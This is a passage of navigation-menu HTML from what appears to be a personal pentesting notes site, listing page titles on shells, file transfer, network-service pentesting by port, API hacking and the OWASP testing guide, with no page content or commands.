      <a href="../htb-vaccine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB vaccine
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Beginners' guide
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Beginners' guide
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../access-control-list/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access Control List
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Authentication
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Authentication
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-authentication/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Authentication
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../servers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Setting up a server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
        
          
          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    All about SHELLS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_4">
            <span class="md-nav__icon md-icon"></span>
            All about SHELLS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bind-shells/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind shells
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../reverse-shells/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse shells
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../spawn-a-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Spawn a shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web-shells/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web shells
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../apt-packet-manager/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    apt packet manager
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../checksum/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    checksum
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloning-a-site/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Clon a site
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crawlers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crawlers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cve-common-vulnerabilities-and-exposures/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cve
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cvss-common-vulnerability-scoring-system/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cvss
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../data-encoding/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Data encoding
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dictionaries/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dictionaries
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_13" >
        
          
          <label class="md-nav__link" for="__nav_4_13" id="__nav_4_13_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    File tranfer techniques
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_13">
            <span class="md-nav__icon md-icon"></span>
            File tranfer techniques
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../transferring-files-techniques-linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../transferring-files-techniques-windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../transferring-files-techniques-code/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Code- netcat python php and others
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/arbitrary-file-upload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bypassing file upload restrictions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file-encryption/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File encryption
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../transferring-files-evading-detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evading techniques when tranferring files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lolbins-lolbas-gtfobins/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LOLbas Living off the land binaries
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../how-to-resolve-run-of-the-mill/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to resolve run of the mill problems
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../remove-bloatware/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to remove bloatware
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/http-authentication-schemes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Authentication schemes
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../http-headers/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP headers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../input-filtering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Input filtering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../machines/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Machines and lab resources
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../my-mkdocs-material-customization/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    My mkdocs and material customized setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../netbios/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NetBIOS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../network-traffic-capture/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network traffic capture
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nt-authority-system/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NT Authority System
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../building-obsidian-plugin/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Obsidian
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../operating-systems/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    operating systems
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../proxies/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    proxies
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssh-for-github/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ssh for github
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../virtualbox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    VirtualBox
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vpn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    VPN notes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting network services
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Pentesting network services
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pentesting-network-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index of services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../0-255-ICMP-internet-control-message-protocol/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    0-255 icmp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../21-ftp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    21 ftp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../22-ssh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    22 ssh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../23-telnet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    23 telnet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../25-565-587-simple-mail-tranfer-protocol-smtp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    25 smtp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../43-whois/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    43 whois
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../53-dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    53 dns
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../69-tftp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    69 tftp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../110-143-993-995-imap-pop3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    110 pop3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../111-32731-rpc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    111 rpcbind
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../135-windows-management-instrumentation-wmi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    135 wmi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../137-138-139-445-smb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    137 smb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../137-138-139-445-smb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    137 smb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../137-138-139-445-smb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    137 smb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../110-143-993-995-imap-pop3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    110 pop3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../161-162-snmp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    161 snmp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../161-162-snmp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    161 snmp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../389-636-ldap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    389 ldap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../137-138-139-445-smb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    137 smb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../512-513-514-remote-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    512 r services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../512-513-514-remote-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    512 r services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../512-513-514-remote-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    512 r services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../25-565-587-simple-mail-tranfer-protocol-smtp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    25 smtp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../25-565-587-simple-mail-tranfer-protocol-smtp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    25 smtp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../623-1900-intelligent-platform-management-interface-ipmi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    623 ipmi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../389-636-ldap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    389 ldap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../873-rsync/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    873 rsync
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../110-143-993-995-imap-pop3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    110 pop3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../110-143-993-995-imap-pop3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    110 pop3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1090-java-rmi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1090 java rmi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1433-mssql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1433 mssql
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1521-oracle-transparent-network-substrate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1521 oracle transparent network substrate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1720-5060-5061-voip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1720 voip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../623-1900-intelligent-platform-management-interface-ipmi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    623 ipmi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../2049-nfs-network-file-system/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2049 nfs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../3128-squid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3128 squid
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../3306-mariadb-mysql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3306 mariadb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../3389-rdp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3389 RDP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../5355-LLMNR/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5355 LLMNR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../5432-postgresql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5432 postgresql
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1720-5060-5061-voip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1720 voip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1720-5060-5061-voip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1720 voip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../5985-5986-winrm-windows-remote-management/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5985 winrm
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../5985-5986-winrm-windows-remote-management/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5985 winrm
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../6379-redis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6379 redis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../6653-openflow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6653 openflow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../8080-jboss/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    8080 jboss
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../27017-27018-mongodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    27017 mongodb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../27017-27018-mongodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    27017 mongodb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../55007-55008-dovecot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    55007 dovecot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../55007-55008-dovecot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    55007 dovecot
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting APIs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Pentesting APIs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../hackingapis/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Rest APIs
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_1">
            <span class="md-nav__icon md-icon"></span>
            Rest APIs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/setting-up-kali/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Setting up the environmet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/api-reconnaissance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Api Reconnaissance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/endpoint-analysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Endpoint Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/scanning-apis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scanning APIs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/api-authentication-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    API authentication attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/exploiting-api-authorization/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exploiting API Authorization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/improper-assets-management/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Testing improper assets management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/mass-assignment/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mass assignment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/server-side-request-forgery-ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server-side Request Forgery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/injection-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Injections attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/evasion-combining-techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evasion and combining techniques
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hackingapis/other-labs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Setting up the labs + writeups
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pentesting-graphql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GraphQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SOAP
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting web
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Pentesting web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../OWASP/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    OWASP Framework
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_1" id="__nav_7_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1">
            <span class="md-nav__icon md-icon"></span>
            OWASP Framework
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_2" >
        
          
          <label class="md-nav__link" for="__nav_7_1_2" id="__nav_7_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    1.Information Gathering
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_2">
            <span class="md-nav__icon md-icon"></span>
            1.Information Gathering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.1. Search engine for Information leakage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
